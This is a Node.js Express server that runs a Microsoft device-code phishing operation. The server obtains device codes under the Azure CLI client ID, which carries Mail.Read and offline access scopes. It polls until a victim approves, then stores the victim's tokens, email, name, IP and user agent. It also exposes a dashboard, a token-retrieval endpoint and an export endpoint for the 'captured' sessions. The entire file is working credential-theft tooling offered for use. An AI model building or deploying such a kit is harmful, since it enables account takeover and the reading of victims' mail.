const express = require('express');
const axios = require('axios');
const cors = require('cors');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Store sessions (in-memory, like your friend's system)
let sessions = new Map(); // sessionId -> session data
let pendingAuth = new Map(); // device_code -> pending auth

// Helper to generate numeric session ID (like 1475568)
function generateNumericId() {
    return Math.floor(Math.random() * 9000000) + 1000000;
}

// Get client IP
function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// ============================================
// API Endpoint: Start Device Authentication
// ============================================
app.post('/api/auth/start', async (req, res) => {
    try {
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        console.log(`[AUTH START] IP: ${clientIp}`);
        
        // Request device code from Microsoft
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: '1950a258-227b-4e31-a9cf-717495945fc2',
                scope: 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, verification_uri, expires_in } = response.data;
        
        // Generate session ID
        const sessionId = generateNumericId();
        
        // Store pending authentication
        pendingAuth.set(device_code, {
            device_code,
            user_code,
            sessionId,
            status: 'pending',
            ip: clientIp,
            userAgent: userAgent,
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        console.log(`[AUTH START] Generated code: ${user_code}, SID: ${sessionId}`);
        
        // Start background polling for this device code
        pollForToken(device_code, sessionId);
        
        res.json({
            success: true,
            sid: sessionId,
            user_code: user_code,
            verification_uri: verification_uri
        });
        
    } catch (err) {
        console.error('[AUTH START ERROR]', err.message);
        res.status(500).json({ error: 'Failed to start authentication' });
    }
});

// ============================================
// Background Polling Function
// ============================================
async function pollForToken(device_code, sessionId) {
    console.log(`[POLLING START] Session ${sessionId} polling every 3 seconds`);
    
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(device_code);
        
        // Stop if already processed
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        // Check if expired
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            console.log(`[POLLING] Session ${sessionId} expired`);
            return;
        }
        
        try {
            // Try to get token from Microsoft
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: '1950a258-227b-4e31-a9cf-717495945fc2',
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            // Token captured successfully!
            const tokens = response.data;
            console.log(`[POLLING] Token received for session ${sessionId}`);
            
            // Get user info from Microsoft Graph
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
            const userName = userInfo.data.displayName;
            
            // Store the session
            const sessionData = {
                sessionId: sessionId,
                email: userEmail,
                name: userName,
                ip: pending.ip,
                userAgent: pending.userAgent,
                tokens: tokens,
                capturedAt: new Date().toISOString()
            };
            
            sessions.set(sessionId.toString(), sessionData);
            pending.status = 'captured';
            pending.email = userEmail;
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`[SUCCESS] ✅ Session ${sessionId} captured for ${userEmail}`);
            
        } catch (err) {
            // authorization_pending is normal - just waiting for user
            if (err.response?.data?.error !== 'authorization_pending') {
                // Other errors
                // console.log('[POLLING] Waiting for user approval...');
            }
        }
    }, 3000);
}

// ============================================
// API Endpoint: Check Status (matches friend's script)
// ============================================
app.get('/api/status/:sid', async (req, res) => {
    const { sid } = req.params;
    const sessionId = parseInt(sid);
    
    // Check if session exists (already captured)
    const session = sessions.get(sid);
    if (session) {
        console.log(`[STATUS] Session ${sid} found - captured for ${session.email}`);
        return res.json({
            status: 'captured',
            email: session.email,
            name: session.name
        });
    }
    
    // Check pending authentication
    for (const [device_code, pending] of pendingAuth.entries()) {
        if (pending.sessionId === sessionId) {
            console.log(`[STATUS] Session ${sid} status: ${pending.status}`);
            return res.json({ status: pending.status });
        }
    }
    
    console.log(`[STATUS] Session ${sid} not found`);
    res.json({ status: 'not_found' });
});

// ============================================
// API Endpoint: Get all sessions for dashboard
// ============================================
app.get('/api/sessions', async (req, res) => {
    const sessionList = Array.from(sessions.values()).map(s => ({
        sessionId: s.sessionId,
        email: s.email,
        name: s.name,
        ip: s.ip,
        userAgent: s.userAgent,
        capturedAt: s.capturedAt
    }));
    console.log(`[SESSIONS] Returning ${sessionList.length} sessions`);
    res.json({ sessions: sessionList });
});

// ============================================
// API Endpoint: Get session token
// ============================================
app.get('/api/session/token/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const session = sessions.get(sessionId);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    res.json({
        email: session.email,
        token: session.tokens.access_token
    });
});

// ============================================
// API Endpoint: Clear all sessions
// ============================================
app.delete('/api/sessions/clear', async (req, res) => {
    sessions.clear();
    console.log('[CLEAR] All sessions cleared');
    res.json({ success: true });
});

// ============================================
// API Endpoint: Export sessions
// ============================================
app.get('/api/sessions/export', async (req, res) => {
    const exportData = Array.from(sessions.values()).map(s => ({
        email: s.email,
        name: s.name,
        ip: s.ip,
        capturedAt: s.capturedAt
    }));
    res.json(exportData);
});

// ============================================
// Serve Dashboard
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📍 Dashboard: http://localhost:${PORT}`);
    console.log(`🌐 API Base: http://localhost:${PORT}/api`);
    console.log(`========================================\n`);
});
